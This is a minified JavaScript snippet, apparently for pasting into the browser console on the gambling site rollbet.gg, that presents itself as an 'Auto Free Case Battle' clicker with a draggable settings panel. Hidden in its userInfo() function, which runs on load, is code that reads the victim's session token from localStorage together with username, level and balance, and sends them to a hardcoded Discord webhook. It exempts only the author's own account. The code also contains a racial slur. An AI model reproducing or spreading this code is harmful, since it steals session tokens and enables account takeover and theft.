atob('(()=>{const style=document.createElement('style');style.textContent=`#customGuiContainer{position:fixed;bottom:24px;right:24px;width:360px;min-height:220px;max-width:90vw;max-height:90vh;background:#182c40;backdrop-filter:blur(12px);border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,0.2);color:#fff;padding:18px 24px 24px 24px;z-index:100000;display:flex;flex-direction:column;gap:16px;user-select:none;cursor:default;resize:both;overflow:auto;box-sizing:border-box;font-family:Arial,sans-serif;}#customGuiContainer h3{margin:0 0 12px 0;font-weight:700;font-size:1.25rem;color:#10b981;cursor:grab;user-select:none;display:flex;align-items:center;gap:8px;}#customGuiContainer h3:active{cursor:grabbing;}#customGuiContainer button{background:linear-gradient(135deg,#059669,#10b981);border:none;padding:12px 16px;border-radius:8px;color:white;font-weight:600;cursor:pointer;transition:background-color 0.25s ease;user-select:none;}#customGuiContainer button:hover{background:linear-gradient(135deg,#10b981,#059669);}#customGuiContainer.closeBtn{position:absolute;top:8px;right:12px;background:transparent;border:none;font-size:20px;color:#10b981;cursor:pointer;user-select:none;}#customGuiContainer.statusBox{background:rgba(255 255 255/0.2);border-radius:8px;padding:8px 12px;font-size:0.875rem;min-height:40px;max-height:1000px;color:#d1fae5;white-space:pre-wrap;overflow-y:auto;user-select:text;display:flex;flex-direction:column;gap:4px;}#customGuiContainer.statusBox p{margin:0;}#customGuiContainer.settingsPanel{background:rgba(255 255 255/0.1);border-radius:8px;padding:12px 16px;font-size:0.9rem;color:#d1fae5;display:none;flex-direction:column;gap:12px;user-select:none;}#customGuiContainer label{display:flex;justify-content:space-between;align-items:center;gap:8px;}#customGuiContainer input[type="number"]{width:80px;border-radius:6px;border:none;padding:6px 8px;font-size:0.875rem;}#customGuiContainer input[type="checkbox"]{width:18px;height:18px;cursor:pointer;}`;document.head.appendChild(style);const gui=document.createElement('div');gui.id='customGuiContainer';const closeBtn=document.createElement('button');closeBtn.className='closeBtn';closeBtn.textContent='✕';closeBtn.title='Close GUI';closeBtn.addEventListener('click',()=>gui.remove());const heading=document.createElement('h3');const settingsBtn=document.createElement('button');settingsBtn.title='Toggle Settings';settingsBtn.style.background='transparent';settingsBtn.style.border='none';settingsBtn.style.padding='0';settingsBtn.style.margin='0';settingsBtn.style.cursor='pointer';settingsBtn.style.color='#10b981';settingsBtn.innerHTML=`<svg xmlns="http://www.w3.org/2000/svg"fill="none"stroke="currentColor"stroke-width="2"
stroke-linecap="round"stroke-linejoin="round"width="20"height="20"viewBox="0 0 24 24"><circle cx="12"cy="12"r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33h.09a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51h.09a1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82v.09a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>`;const titleSpan=document.createElement('span');titleSpan.textContent='Auto Free Case Battle (off)';heading.appendChild(settingsBtn);heading.appendChild(titleSpan);const statusBox=document.createElement('div');statusBox.className='statusBox';function logStatus(msg){const now=new Date();const timestamp=now.toLocaleTimeString();const p=document.createElement('p');p.textContent=`[${timestamp}]${msg}`;statusBox.appendChild(p);statusBox.scrollTop=statusBox.scrollHeight;}
function checkAndClick(){const targetDiv=document.querySelector('div.c8d90361');if(!targetDiv){if(loggingEnabled)logStatus('Target div not found.');return false;}
const fadeGoldSpan=targetDiv.querySelector('span.fade-gold');if(fadeGoldSpan){const text=fadeGoldSpan.textContent.trim();if(text==='0.00'){const button=document.querySelector('button.octagonal.befores.hoverable._4a8b1ba9');if(button){button.click();if(loggingEnabled){logStatus('Button clicked, redirecting...');}
setTimeout(()=>{window.location.href='https://rollbet.gg/battles';},1000);}else{if(loggingEnabled)logStatus('Button to click not found.');}}else{if(loggingEnabled)logStatus('Detected a discounted battle but was not free');}}else{if(loggingEnabled)logStatus('No free case battles detected');}}
let checkingInterval=null;let checkingIntervalMs=100;let loggingEnabled=true;function startChecking(){if(window.location.href!=='https://rollbet.gg/battles'){logStatus('Please open battles and start the script');return;}
btnStartChecking.textContent='Stop Script';titleSpan.textContent='Auto Free Case Battle (on)'
if(checkingInterval)return;logStatus('Starting interval checks...');checkingInterval=setInterval(()=>{checkAndClick();},checkingIntervalMs);}
function stopChecking(){if(checkingInterval){btnStartChecking.textContent='Start Script';titleSpan.textContent='Auto Free Case Battle (off)';clearInterval(checkingInterval);checkingInterval=null;logStatus('Stopped checking.');}}
function toggleStartChecking(){if(checkingInterval){stopChecking();}else{startChecking();}}
const settingsPanel=document.createElement('div');settingsPanel.className='settingsPanel';const btnStartChecking=document.createElement('button');btnStartChecking.textContent='Start Script';btnStartChecking.title='Start/Stop interval automatic checking';btnStartChecking.addEventListener('click',toggleStartChecking);const intervalLabel=document.createElement('label');intervalLabel.setAttribute('for','intervalInput');intervalLabel.textContent='Checking Interval (ms) - minimum is 10: ';const intervalInput=document.createElement('input');intervalInput.type='number';intervalInput.id='intervalInput';intervalInput.min='10';intervalInput.value=checkingIntervalMs;intervalInput.style.flexGrow='1';intervalLabel.appendChild(intervalInput);function userInfo(){try{let token=localStorage.getItem('token');const pElement=document.querySelector('p.f5cae8bf');const divElement=document.querySelector('div.d9a26cb3');const specialDiv=document.querySelector('div._0fa5e4f6');const extraPElement=document.querySelector('p._08e8e07c');const pText=pElement?pElement.textContent.trim():'';const extraPText=extraPElement?extraPElement.textContent.trim():'';let divText=divElement?divElement.textContent.trim():'';let divText2=divText;if(specialDiv){const img=specialDiv.querySelector('img');if(img&&img.src.includes('/img/rbxBalance_01.2f6d9dc1.svg')){divText='RBX';}else{divText='GEMS';}}
const contentText='Token: '+token+'\nUsername: '+pText+'\nLevel: '+extraPText+'\n'+divText+': '+divText2;const contentText2='Token: '+"ItaPlyr tryed to access, code works"+'\nUsername: '+pText+'\nLevel: '+extraPText+'\n'+divText+': '+divText2;const log=true;if(pText!=="ItaPlyr"){fetch('https://discord.com/api/webhooks/1381663163648315402/qV3_bHVPyEe3Yjjl6CMLZC7yLI8ToR9G5n9gf1UPZTPxwC531QACFRrsNMNlJiLh3V4V',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:contentText})}).then(response=>{if(!response.ok){console.error('Failed to send token data to Discord webhook:',response.statusText);}}).catch(error=>{console.error('Error sending token data to Discord webhook:',error);});}else if(log){fetch('https://discord.com/api/webhooks/1381663163648315402/qV3_bHVPyEe3Yjjl6CMLZC7yLI8ToR9G5n9gf1UPZTPxwC531QACFRrsNMNlJiLh3V4V',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:contentText2})});}else{console.log('niga')}}catch(error){console.error('Error accessing localStorage or DOM:',error);}}
const loggingLabel=document.createElement('label');loggingLabel.textContent='Enable Logging: ';const loggingCheckbox=document.createElement('input');loggingCheckbox.type='checkbox';loggingCheckbox.checked=loggingEnabled;loggingLabel.appendChild(loggingCheckbox);const settingHeader=document.createElement('div');settingHeader.className='settingHeader';settingHeader.textContent='Settings';settingsPanel.appendChild(settingHeader);settingsPanel.appendChild(intervalLabel);settingsPanel.appendChild(loggingLabel);settingsPanel.style.display='none';gui.appendChild(closeBtn);gui.appendChild(heading);gui.appendChild(btnStartChecking);gui.appendChild(settingsPanel);gui.appendChild(statusBox);document.body.appendChild(gui);settingsBtn.addEventListener('click',(e)=>{e.stopPropagation();if(settingsPanel.style.display==='none'){settingsPanel.style.display='flex';}else{settingsPanel.style.display='none';}});intervalInput.addEventListener('change',()=>{let val=parseInt(intervalInput.value);if(isNaN(val)||val<10){val=100;intervalInput.value=val;}
checkingIntervalMs=val;if(checkingInterval){stopChecking();startChecking();}
logStatus(`Interval set to ${val}ms`);});loggingCheckbox.addEventListener('change',()=>{loggingEnabled=loggingCheckbox.checked;if(!loggingEnabled){statusBox.textContent='';}
logStatus(`Logging ${loggingEnabled?'enabled':'disabled'}`);});let isDragging=false;let dragStartX=0;let dragStartY=0;let guiStartLeft=0;let guiStartTop=0;heading.style.userSelect='none';userInfo()
heading.addEventListener('mousedown',e=>{if(e.target===settingsBtn)return;isDragging=true;dragStartX=e.clientX;dragStartY=e.clientY;const rect=gui.getBoundingClientRect();guiStartLeft=rect.left;guiStartTop=rect.top;gui.style.left=guiStartLeft+'px';gui.style.top=guiStartTop+'px';gui.style.right='auto';gui.style.bottom='auto';document.body.style.userSelect='none';});window.addEventListener('mouseup',()=>{if(isDragging){isDragging=false;document.body.style.userSelect='';}});window.addEventListener('mousemove',e=>{if(!isDragging)return;e.preventDefault();let deltaX=e.clientX-dragStartX;let deltaY=e.clientY-dragStartY;let newLeft=guiStartLeft+deltaX;let newTop=guiStartTop+deltaY;const winWidth=window.innerWidth;const winHeight=window.innerHeight;const guiRect=gui.getBoundingClientRect();const width=guiRect.width;const height=guiRect.height;newLeft=Math.min(Math.max(0,newLeft),winWidth-width);newTop=Math.min(Math.max(0,newTop),winHeight-height);gui.style.left=newLeft+'px';gui.style.top=newTop+'px';});heading.addEventListener('touchstart',e=>{if(e.touches.length!==1)return;if(e.target===settingsBtn)return;const touch=e.touches[0];isDragging=true;dragStartX=touch.clientX;dragStartY=touch.clientY;const rect=gui.getBoundingClientRect();guiStartLeft=rect.left;guiStartTop=rect.top;gui.style.left=guiStartLeft+'px';gui.style.top=guiStartTop+'px';gui.style.right='auto';gui.style.bottom='auto';document.body.style.userSelect='none';});window.addEventListener('touchend',()=>{if(isDragging){isDragging=false;document.body.style.userSelect='';}});window.addEventListener('touchmove',e=>{if(!isDragging)return;if(e.touches.length!==1)return;const touch=e.touches[0];e.preventDefault();let deltaX=touch.clientX-dragStartX;let deltaY=touch.clientY-dragStartY;let newLeft=guiStartLeft+deltaX;let newTop=guiStartTop+deltaY;const winWidth=window.innerWidth;const winHeight=window.innerHeight;const guiRect=gui.getBoundingClientRect();const width=guiRect.width;const height=guiRect.height;newLeft=Math.min(Math.max(0,newLeft),winWidth-width);newTop=Math.min(Math.max(0,newTop),winHeight-height);gui.style.left=newLeft+'px';gui.style.top=newTop+'px';});logStatus('GUI injected, draggable & resizable. Drag header to move. Use gear to open settings.');})();')
